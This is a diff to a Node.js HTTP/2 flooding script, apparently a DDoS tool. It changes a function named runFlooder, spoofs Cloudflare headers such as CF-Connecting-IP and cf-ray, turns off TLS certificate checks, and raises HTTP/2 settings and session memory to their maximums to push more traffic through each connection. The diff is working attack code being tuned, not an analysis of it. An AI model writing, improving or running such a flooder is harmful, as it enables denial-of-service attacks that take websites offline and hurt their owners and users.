@@ -1,11 +1,11 @@
 const net = require('net');
+const axios = require('axios');
 const http2 = require("http2");
 const tls = require('tls');
 const cluster = require('cluster');
 const url = require("url");
 const fs = require("fs");
 const crypto = require("crypto");
-const axios = require('axios');
 const https = require('https');
 const childProcess = require('child_process');
 // Disable event listener limits
@@ -5147,7 +5147,7 @@ const refers = [
 
 
 const userAgents = [
-    "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
+  "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
   "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
   "portalmmm/2.0 N410i(c20;TB) ",
   "Python-urllib/2.5",
@@ -5197,7 +5197,7 @@ const userAgents = [
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
-    'POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1',
+  'POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1',
   'POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1',
   'portalmmm/2.0 N410i(c20;TB) ',
   'Python-urllib/2.5',
@@ -6621,6 +6621,7 @@ class NetSocket {
     .catch((error) => callback(undefined, error.message));
   }
 }
+
 const Socker = new NetSocket();
 headers[':method'] = "GET";
 headers[':method'] = "POST";
@@ -6734,6 +6735,7 @@ headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
  headers["CF-Connecting-IP"] = spoofed2;
  headers["CF-RAY"] = "randomRayValue";
  headers["cf-ray"] = "randomRayValue";
+ headers["cf-ray"] = "95df40ba9b6066ff-AMS";
  headers["cf-ray"] = "948348ffe847e88a-HKG";
  headers["CF-RAY"] = "945cbef1d87672ce-HKG"; 
  headers["cf-ray"] = "947f742e0c855def-HKG";
@@ -7002,7 +7004,7 @@ function runFlooder() {
       rejectUnauthorized: false, // Bypass SSL certificate validation
       servername: parsedTarget.host,
       secureProtocol: ["TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
-      sessionTimeout: 5000 // 5 seconds
+      sessionTimeout: 10000 // 10 seconds
     };
 
     // Create TLS connection
@@ -7027,14 +7029,24 @@ function runFlooder() {
     });
 
     // Update HTTP/2 settings
-      http2Connection.settings({
-      headerTableSize: 65536,
-      maxConcurrentStreams: 20000,
-      initialWindowSize: 6291456,
-      maxHeaderListSize: 262144,
-      enablePush: false
+        http2Connection.settings({
+        headerTableSize: 4294967295,          // Max 32-bit unsigned integer (4GB)
+        maxConcurrentStreams: 2147483647,     // Max 32-bit signed integer (2^31-1)
+        initialWindowSize: 2147483647,        // Max 32-bit signed integer (2^31-1)
+        maxFrameSize: 16777215,               // Maximum allowed frame size (2^24-1)
+        maxHeaderListSize: 4294967295,        // Max 32-bit unsigned integer (4GB)
+        enablePush: false,
+        enableConnectProtocol: true           // Additional setting for extended capabilities
     });
 
+    http2Connection.setMaxSendHeaderBlockLength(4294967295);
+    http2Connection.setMaxSessionMemory(4294967296); // 4GB session memory
+    
+    http2Connection.priority({ 
+      exclusive: true, 
+      weight: 256, 
+      parent: 0 
+    });
     // Connection event handlers
     http2Connection.on("connect", () => {});
     
